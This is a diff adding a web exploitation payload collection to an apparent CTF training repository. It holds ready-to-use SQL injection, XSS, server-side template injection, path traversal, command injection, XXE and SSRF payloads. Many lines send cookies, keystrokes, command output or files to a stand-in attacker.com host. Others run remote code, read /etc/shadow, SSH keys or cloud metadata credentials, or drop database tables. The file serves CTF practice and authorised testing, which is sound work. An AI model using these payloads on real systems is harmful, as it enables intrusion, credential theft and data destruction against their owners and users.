@@ -1,0 +1,507 @@
+# ============================================================
+#  CTF Web Exploitation Payload Collection
+#  ctf-zero-to-hero — resources/payloads/web_payloads.txt
+# ============================================================
+#
+# How to use this file
+# --------------------
+# Each section is labelled with a header like [SECTION_NAME].
+# Lines starting with '#' are comments / usage notes.
+# Blank lines separate logical groups within a section.
+#
+# Quick grep examples:
+#   grep -A5 "\[XSS\]"       web_payloads.txt   # show XSS section
+#   grep -A5 "\[SQLI_MYSQL\]" web_payloads.txt  # MySQL-specific injections
+#
+# WARNING: For authorised testing and CTF challenges ONLY.
+# ============================================================
+
+
+# ============================================================
+# [SQLI_MYSQL]  SQL Injection — MySQL
+# ============================================================
+# Classic authentication bypass
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR 1=1--
+admin'--
+') OR ('1'='1
+" OR "1"="1
+" OR "1"="1"--
+
+# Error-based (forces MySQL to leak data in error messages)
+' AND extractvalue(1,concat(0x7e,(SELECT version())))--
+' AND updatexml(1,concat(0x7e,(SELECT database())),1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),concat((SELECT database()),0x3a,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+# UNION-based (number of NULLs = number of columns; adjust as needed)
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,table_name,3 FROM information_schema.tables--
+' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--
+
+# Blind Boolean-based (true/false responses leak data one bit at a time)
+' AND 1=1--
+' AND 1=2--
+' AND substring(database(),1,1)='a'--
+' AND (SELECT count(*) FROM information_schema.tables WHERE table_schema=database())>0--
+
+# Time-based blind (infer data from response delays)
+' AND sleep(5)--
+' AND IF(1=1,sleep(5),0)--
+' AND IF(substring(database(),1,1)='a',sleep(5),0)--
+
+# Out-of-band (DNS exfil — needs outbound DNS from the server)
+' UNION SELECT load_file(concat('\\\\',(SELECT database()),'.attacker.com\\share\\a'))--
+
+# stacked queries (when multi-statement is allowed)
+'; INSERT INTO users(username,password) VALUES('hacked','hacked')--
+'; DROP TABLE users--
+
+
+# ============================================================
+# [SQLI_POSTGRESQL]  SQL Injection — PostgreSQL
+# ============================================================
+' OR '1'='1
+' OR 1=1--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT 1,version()--
+' UNION SELECT 1,current_database()--
+' UNION SELECT 1,table_name FROM information_schema.tables--
+' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'--
+
+# Error-based
+' AND 1=cast((SELECT version()) AS int)--
+' AND 1=cast((SELECT current_database()) AS int)--
+
+# Time-based blind
+'; SELECT pg_sleep(5)--
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+
+# Command execution (requires superuser)
+'; COPY (SELECT '') TO PROGRAM 'id > /tmp/out'--
+'; CREATE TABLE cmd_output (output text); COPY cmd_output FROM PROGRAM 'id'--
+
+
+# ============================================================
+# [SQLI_SQLITE]  SQL Injection — SQLite
+# ============================================================
+' OR '1'='1
+' OR 1=1--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT 1,sqlite_version()--
+' UNION SELECT 1,name FROM sqlite_master WHERE type='table'--
+' UNION SELECT 1,sql FROM sqlite_master WHERE type='table' AND name='users'--
+' UNION SELECT 1,group_concat(username||':'||password) FROM users--
+
+# Blind Boolean
+' AND substr((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1),1,1)='u'--
+
+# Time-based (SQLite has no sleep(); use heavy computation instead)
+' AND 1=(SELECT CASE WHEN (1=1) THEN (WITH RECURSIVE t(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM t WHERE x<10000000) SELECT COUNT(*) FROM t) ELSE 0 END)--
+
+
+# ============================================================
+# [SQLI_MSSQL]  SQL Injection — Microsoft SQL Server
+# ============================================================
+' OR '1'='1
+' OR 1=1--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT 1,@@version--
+' UNION SELECT 1,db_name()--
+' UNION SELECT 1,name FROM master..sysdatabases--
+' UNION SELECT 1,name FROM sysobjects WHERE xtype='U'--
+' UNION SELECT 1,name FROM syscolumns WHERE id=object_id('users')--
+
+# Error-based
+' AND 1=convert(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--
+
+# Time-based blind
+'; WAITFOR DELAY '0:0:5'--
+' IF (1=1) WAITFOR DELAY '0:0:5'--
+
+# Command execution (requires xp_cmdshell; disabled by default)
+'; EXEC xp_cmdshell('id')--
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
+
+
+# ============================================================
+# [XSS_REFLECTED]  Cross-Site Scripting — Reflected
+# ============================================================
+# Basic alert probes
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+
+# Attribute-breaking
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+' onmouseover='alert(1)
+
+# Without angle brackets (useful when < > are filtered)
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+
+# Bypassing basic filters
+<ScRiPt>alert(1)</ScRiPt>
+<script>alert`1`</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+
+# Event handler injection
+<body onload=alert(1)>
+<svg onload=alert(1)>
+<iframe onload=alert(1)>
+<img src=x onerror=alert(1)>
+<input autofocus onfocus=alert(1)>
+<video src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+
+# Cookie / token stealing
+<script>document.location='https://attacker.com/?c='+document.cookie</script>
+<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>
+<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
+
+
+# ============================================================
+# [XSS_STORED]  Cross-Site Scripting — Stored / Persistent
+# ============================================================
+# Same probes as reflected, but stored in a database field.
+# These execute for every user who views the page.
+<script>alert(document.cookie)</script>
+<img src=x onerror=this.src='https://attacker.com/?c='+document.cookie>
+<svg/onload=fetch('https://attacker.com/?c='+btoa(document.cookie))>
+
+# Keylogger skeleton (requires controlled external server)
+<script>
+document.onkeypress=function(e){
+  new Image().src='https://attacker.com/log?k='+e.key;
+};
+</script>
+
+# BeEF hook (browser exploitation framework)
+<script src="http://attacker.com:3000/hook.js"></script>
+
+
+# ============================================================
+# [XSS_DOM]  Cross-Site Scripting — DOM-Based
+# ============================================================
+# These exploit sinks like innerHTML, document.write, eval, location.hash, etc.
+# Inject via URL fragment (#), query string, or writable JS variables.
+
+# location.hash sink
+#<img src=x onerror=alert(1)>
+#<script>alert(document.domain)</script>
+
+# document.write sink
+</script><script>alert(1)</script>
+"><script>alert(1)</script>
+
+# innerHTML sink
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+
+# eval() sink — breaks out of string context
+'; alert(1); //
+\'; alert(1); //
+"-alert(1)-"
+
+# postMessage exploitation
+<iframe src="target.html" onload="this.contentWindow.postMessage('<img src=x onerror=alert(1)>','*')"></iframe>
+
+
+# ============================================================
+# [SSTI_JINJA2]  Server-Side Template Injection — Jinja2 (Python/Flask)
+# ============================================================
+# Detection probes (safe — just math expressions)
+{{7*7}}
+{{7*'7'}}
+{{config}}
+{{self}}
+{{request}}
+
+# Read environment variables
+{{config.items()}}
+{{request.environ}}
+
+# Read files (Linux)
+{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
+
+# Remote code execution (Python 3)
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+
+# Shorter RCE (class index may differ — enumerate subclasses first)
+{{''.__class__.__mro__[1].__subclasses__()[<index>]('id',shell=True,stdout=-1).communicate()}}
+
+# Filter bypass (dot → attr filter)
+{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__import__')('os')|attr('popen')('id')|attr('read')()}}
+
+
+# ============================================================
+# [SSTI_TWIG]  Server-Side Template Injection — Twig (PHP)
+# ============================================================
+# Detection
+{{7*7}}
+{{7*'7'}}
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+
+# File read
+{{'/etc/passwd'|file_excerpt(1,30)}}
+{{source('/etc/passwd')}}
+
+# RCE
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{[0]|reduce('system','id')}}
+
+# Sandbox bypass
+{{_self.env.setCache("ftp://attacker.com:21")}}{{_self.env.loadTemplate("backdoor")}}
+
+
+# ============================================================
+# [SSTI_FREEMARKER]  Server-Side Template Injection — FreeMarker (Java)
+# ============================================================
+# Detection
+${7*7}
+#{7*7}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+
+# RCE
+${"freemarker.template.utility.Execute"?new()("id")}
+<#assign ex="freemarker.template.utility.Execute"?new()>
+${ex("cat /etc/passwd")}
+
+# Read files
+${object.getClass().forName("java.nio.file.Files").readAllBytes(object.getClass().forName("java.nio.file.Paths").get("/etc/passwd"))}
+
+
+# ============================================================
+# [SSTI_ERB]  Server-Side Template Injection — ERB (Ruby)
+# ============================================================
+# Detection
+<%= 7*7 %>
+<%= system('id') %>
+<%= `id` %>
+
+# RCE
+<%= IO.popen('id').read %>
+<%= require 'open3'; Open3.capture2('id')[0] %>
+
+# File read
+<%= File.read('/etc/passwd') %>
+
+
+# ============================================================
+# [PATH_TRAVERSAL]  Path Traversal / Local File Inclusion (LFI)
+# ============================================================
+# Linux targets
+../../../../etc/passwd
+../../../../etc/shadow
+../../../../etc/hosts
+../../../../proc/self/environ
+../../../../proc/self/cmdline
+../../../../var/log/apache2/access.log
+../../../../var/log/nginx/access.log
+../../../../home/user/.ssh/id_rsa
+../../../../root/.bash_history
+
+# Windows targets
+..\..\..\..\windows\win.ini
+..\..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\..\boot.ini
+
+# Encoded variants (bypass naive filters)
+..%2f..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252f..%252fetc%252fpasswd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%c0%af..%c0%afetc%c0%afpasswd
+....//....//....//....//etc/passwd
+....//...//...//..//etc/passwd
+
+# PHP wrappers (when the parameter is passed to include() / require())
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=string.rot13/resource=index.php
+php://input
+php://fd/0
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+expect://id
+zip://upload/shell.jpg%23shell.php
+
+# Null byte injection (older PHP versions — terminates string)
+../../../../etc/passwd%00
+../../../../etc/passwd\0
+../../../../etc/passwd%00.jpg
+
+# Double encoding (bypass two rounds of URL decode)
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+
+# ============================================================
+# [CMD_INJECTION]  OS Command Injection
+# ============================================================
+# Basic separators — try each in the vulnerable parameter
+; id
+& id
+| id
+|| id
+&& id
+`id`
+$(id)
+; whoami
+; cat /etc/passwd
+; ls -la /
+; env
+; printenv
+
+# Encoded / escaped variants
+;%20id
+%3B id
+%7C id
+%26 id
+
+# Out-of-band / blind (trigger DNS lookup to confirm injection)
+; nslookup attacker.com
+; curl http://attacker.com/?`id`
+; wget http://attacker.com/`id`
+$(curl http://attacker.com/?x=$(id))
+
+# Windows command injection
+& whoami
+| whoami
+&& whoami
+|| whoami
+; whoami
+`whoami`
+$(whoami)
+& type C:\Windows\win.ini
+& dir C:\
+
+# Filter bypasses
+i'""d
+w'h'o'a'm'i
+/bin/c'a't /etc/passwd
+cat${IFS}/etc/passwd
+cat$'\x20'/etc/passwd
+{cat,/etc/passwd}
+c\at /etc/passwd
+
+
+# ============================================================
+# [XXE]  XML External Entity Injection
+# ============================================================
+# Classic file read (Linux)
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+# Classic file read (Windows)
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
+<foo>&xxe;</foo>
+
+# SSRF via XXE
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+<foo>&xxe;</foo>
+
+# Blind XXE — out-of-band exfil via DNS / HTTP
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+  %xxe;
+]>
+<foo>&exfil;</foo>
+
+# evil.dtd content (host on attacker.com):
+# <!ENTITY % data SYSTEM "file:///etc/passwd">
+# <!ENTITY % exfil "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%data;'>">
+# %exfil;
+
+# Error-based XXE (trigger an XML parser error that includes file content)
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
+  %eval;
+  %err;
+]>
+<foo>test</foo>
+
+# XXE in SVG (file upload attack)
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text>&xxe;</text>
+</svg>
+
+# XXE via XInclude (when you can't control the DOCTYPE)
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+
+
+# ============================================================
+# [SSRF]  Server-Side Request Forgery — Bypass Techniques
+# ============================================================
+# Basic SSRF probes — AWS metadata service
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+http://[::ffff:169.254.169.254]/latest/meta-data/
+
+# GCP metadata service
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Azure metadata service
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+
+# Localhost bypass variants (when "localhost" and "127.0.0.1" are blocked)
+http://127.0.0.1/
+http://0.0.0.0/
+http://[::1]/
+http://localhost/
+http://0177.0.0.1/           # octal
+http://2130706433/           # decimal IP (127.0.0.1)
+http://0x7f000001/           # hex IP
+http://127.1/                # short notation
+http://127.000.000.001/      # extra zeros
+http://①②⑦.⓪.⓪.①/         # Unicode lookalike
+
+# DNS rebinding / open redirect to bypass allowlists
+http://attacker.com/redirect?url=http://127.0.0.1/admin
+http://127.0.0.1.attacker.com/   # DNS resolves to 127.0.0.1
+
+# Protocol smuggling
+gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a   # Redis via SSRF
+dict://127.0.0.1:6379/INFO
+ftp://127.0.0.1/
+
+# Internal service discovery (adjust port range as needed)
+http://127.0.0.1:22/      # SSH
+http://127.0.0.1:80/      # HTTP
+http://127.0.0.1:443/     # HTTPS
+http://127.0.0.1:3306/    # MySQL
+http://127.0.0.1:5432/    # PostgreSQL
+http://127.0.0.1:6379/    # Redis
+http://127.0.0.1:8080/    # Alt HTTP
+http://127.0.0.1:8443/    # Alt HTTPS
+http://127.0.0.1:9200/    # Elasticsearch
+http://127.0.0.1:27017/   # MongoDB
+
+# URL scheme tricks
+file:///etc/passwd
+file://localhost/etc/passwd
+jar:http://attacker.com/evil.jar!/
+netdoc:///etc/passwd
